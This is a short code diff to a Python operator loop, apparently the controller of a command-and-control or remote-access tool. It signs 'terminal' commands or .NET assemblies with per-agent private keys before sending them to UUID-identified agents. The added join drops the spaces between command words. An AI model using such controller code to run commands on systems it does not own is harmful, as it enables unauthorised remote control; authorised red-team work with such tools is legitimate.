@@ -118,6 +118,7 @@ while True:
         splits = choice.split()
         if splits[0] == "terminal":
             cm = splits[1:]
+            cm = ''.join(cm)
         elif splits[0] == "dotnet":
             path = splits[1:]
             with open(path, "rb") as in_file:
@@ -136,9 +137,9 @@ while True:
         whoami = connector["WhoAmI"]
         nonce =  connector["Nonce"]
         result = connector["Result"]
-        byte_inp = cm#bytes(cm, 'utf-8')
+        byte_inp = bytes(cm, 'utf-8')
 
-        with open('keys/' + uuid + ".pem", "rb") as key_file:  # Read in the pem file for the UUID
+        with open('../Builder/keys/' + uuid + ".pem", "rb") as key_file:  # Read in the pem file for the UUID
             private_key = serialization.load_pem_private_key(key_file.read(), password=None)
         signature = private_key.sign(
             byte_inp,
@@ -147,7 +148,7 @@ while True:
         )
         signature_decoded = binascii.b2a_hex(signature).decode()
 
-        with open('keys/' + uuid + ".pub.pem", "rb") as key_file:  # Read in the pem file for the UUID
+        with open('../Builder/keys/' + uuid + ".pub.pem", "rb") as key_file:  # Read in the pem file for the UUID
             public_key = serialization.load_pem_public_key(key_file.read())
         try:
             public_key.verify(
